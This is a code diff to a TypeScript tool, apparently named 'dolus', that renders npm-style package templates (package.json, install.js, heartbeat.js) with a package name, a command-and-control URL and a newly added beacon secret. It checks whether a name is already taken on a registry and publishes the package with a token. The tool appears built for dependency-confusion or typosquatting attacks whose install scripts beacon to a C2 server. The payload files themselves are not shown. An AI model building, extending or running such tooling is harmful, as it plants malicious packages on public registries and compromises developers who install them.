@@ -10,8 +10,11 @@ import https from 'https';
 const TEMPLATE_DIR = path.join(process.cwd(), '..', 'packages', 'template');
 const TEMPLATE_FILES = ['package.json', 'install.js', 'heartbeat.js'];
 
-export function renderTemplate(content: string, pkgName: string, c2Url: string): string {
-  return content.replaceAll('__PKG_NAME__', pkgName).replaceAll('__C2_URL__', c2Url);
+export function renderTemplate(content: string, pkgName: string, c2Url: string, beaconSecret = ''): string {
+  return content
+    .replaceAll('__PKG_NAME__', pkgName)
+    .replaceAll('__C2_URL__', c2Url)
+    .replaceAll('__BEACON_SECRET__', beaconSecret);
 }
 
 export function packageExistsOnRegistry(pkgName: string, registryUrl: string): Promise<boolean> {
@@ -35,6 +38,7 @@ export function publishPackage(
   token: string | null,
   c2Url: string,
   installJs?: string,
+  beaconSecret = '',
 ): { success: boolean; output: string } {
   const tmpDir = path.join(os.tmpdir(), `dolus-${crypto.randomUUID()}`);
   fs.mkdirSync(tmpDir, { recursive: true });
@@ -44,7 +48,7 @@ export function publishPackage(
       const raw = file === 'install.js' && installJs != null
         ? installJs
         : fs.readFileSync(path.join(TEMPLATE_DIR, file), 'utf8');
-      fs.writeFileSync(path.join(tmpDir, file), renderTemplate(raw, pkgName, c2Url));
+      fs.writeFileSync(path.join(tmpDir, file), renderTemplate(raw, pkgName, c2Url, beaconSecret));
     }
 
     if (token) {
